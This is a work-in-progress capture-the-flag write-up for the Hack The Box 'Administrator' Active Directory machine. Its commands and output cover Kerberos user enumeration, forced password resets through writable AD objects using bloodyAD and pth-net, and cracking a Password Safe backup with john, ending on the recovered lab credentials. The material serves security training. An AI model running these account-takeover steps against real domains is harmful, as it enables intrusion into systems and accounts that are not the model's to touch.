# Administrator - HTB Write-up (Work in progress)
<img src="https://labs.hackthebox.com/storage/avatars/9d232b1558b7543c7cb85f2774687363.png" width="200" height="200">

As is common in real life Windows pentests, you will start the Administrator box with credentials for the following account: 

Username: `Olivia` 
Password: `ichliebedich`

## Initial portscan
```shell
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-03-10 00:57:12Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
52801/tcp open  msrpc         Microsoft Windows RPC
60218/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
60223/tcp open  msrpc         Microsoft Windows RPC
60245/tcp open  msrpc         Microsoft Windows RPC
60249/tcp open  msrpc         Microsoft Windows RPC
60283/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-03-10T00:58:04
|_  start_date: N/A
|_clock-skew: 6h59m01s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```

## Port 21 - FTP
Can't access with `Olivia` credentials.

## Port 53 - Simple DNS
Let's run gobuster in dns mode, maybe we can get a subdomain.

```shell
❯ gobuster dns -d $domain -r $ip -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Domain:     administrator.htb
[+] Threads:    10
[+] Resolver:   10.129.74.224
[+] Timeout:    1s
[+] Wordlist:   /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
===============================================================
Starting gobuster in DNS enumeration mode
===============================================================
Found: dc.administrator.htb
Found: gc._msdcs.administrator.htb
Found: domaindnszones.administrator.htb
Found: forestdnszones.administrator.htb
```
Add all the domians to `/etc/hosts`.

## Port 88 - Kerberos

**Users enumeration**
```shell
❯ ./kerbrute -d $domain --dc $ip userenum /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames-dup.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 03/09/25 - Ronnie Flathers @ropnop

2025/03/09 14:19:32 >  Using KDC(s):
2025/03/09 14:19:32 >   10.129.74.224:88

2025/03/09 14:19:32 >  [+] VALID USERNAME:       michael@administrator.htb
2025/03/09 14:19:35 >  [+] VALID USERNAME:       benjamin@administrator.htb
2025/03/09 14:19:44 >  [+] VALID USERNAME:       administrator@administrator.htb
2025/03/09 14:19:44 >  [+] VALID USERNAME:       emily@administrator.htb
2025/03/09 14:19:48 >  [+] VALID USERNAME:       olivia@administrator.htb
2025/03/09 14:19:56 >  [+] VALID USERNAME:       ethan@administrator.htb
```
DOMAIN SID: `S-1-5-21-1088858960-373806567-254189436`

## Port 445 - SMB/CIFS
```shell
❯ nxc smb $ip -u Olivia -p ichliebedich --shares
SMB         10.129.74.224   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.129.74.224   445    DC               [+] administrator.htb\Olivia:ichliebedich 
SMB         10.129.74.224   445    DC               [*] Enumerated shares
SMB         10.129.74.224   445    DC               Share           Permissions     Remark
SMB         10.129.74.224   445    DC               -----           -----------     ------
SMB         10.129.74.224   445    DC               ADMIN$                          Remote Admin
SMB         10.129.74.224   445    DC               C$                              Default share
SMB         10.129.74.224   445    DC               IPC$            READ            Remote IPC
SMB         10.129.74.224   445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.74.224   445    DC               SYSVOL          READ            Logon server share 
```

## BloodyAD - Writable AD Objects
```shell
❯ bloodyAD --host $ip -d administrator.htb -u Olivia -p ichliebedich get writable

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=administrator,DC=htb
permission: WRITE

distinguishedName: CN=Olivia Johnson,CN=Users,DC=administrator,DC=htb
permission: WRITE

distinguishedName: CN=Michael Williams,CN=Users,DC=administrator,DC=htb
permission: CREATE_CHILD; WRITE
OWNER: WRITE
DACL: WRITE
```

## BloodyAD - Change the password of michael user
In the previous run we saw that we have access to michael user, let's change his password.

```shell
❯ bloodyAD --host $ip -d administrator.htb -u Olivia -p ichliebedich set password michael password123
[+] Password changed successfully!
```

## Analyzing with Bloodhound CE
Use bloodhound-python to dump all info from AD then upload to BloodHound CE to analysis.

It reveals that user `michael` can change the password of user `benjamin` by using the `ForceChangePassword` method.

## Change the password of user benjamin
```shell
❯ pth-net rpc password "benjamin" "newP@ssword2022" -U "ADMINISTRATOR"/"michael"%"password123" -S "10.129.74.224"
E_md4hash wrapper called.
```

**New credentials:**
`benjamin`/`newP@ssword2022`

## Using new credentials
We try the new credentials in all services again. In the ftp we find the file `Backup.psafe3`.

Doing some research we can get the hash for john using `pwsafe2john` utility.

```shell
❯ pwsafe2john Backup.psafe3
Backu:$pwsafe$*3*4ff588b74906263ad2abba592aba35d58bcd3a57e307bf79c8479dec6b3149aa*2048*1a941c10167252410ae04b7b43753aaedb4ec63e3f18c646bb084ec4f0944050
```

Now use it with john-the-ripper.
```shell
❯ john --wordlist=/usr/share/wordlists/rockyou.txt Backup.psafe3.hash
Using default input encoding: UTF-8
Loaded 1 password hash (pwsafe, Password Safe [SHA256 256/256 AVX2 8x])
Cost 1 (iteration count) is 2048 for all loaded hashes
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tekieromucho     (Backu)     
1g 0:00:00:00 DONE (2025-03-09 23:50) 6.666g/s 81920p/s 81920c/s 81920C/s 123456..hawkeye
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

**Credentials of file**
`tekieromucho`

**Contents of the file**
- `alenxander` / `UrkIbagoxMyUGw0aPlj9B0AXSea4Sw`
- `emily` / `UXLCI5iETUsIBoFVTj8yQFKoHjXmb`
- `emma` / `WwANQWnmJnGV07WQN8bMS7FMAbjNur`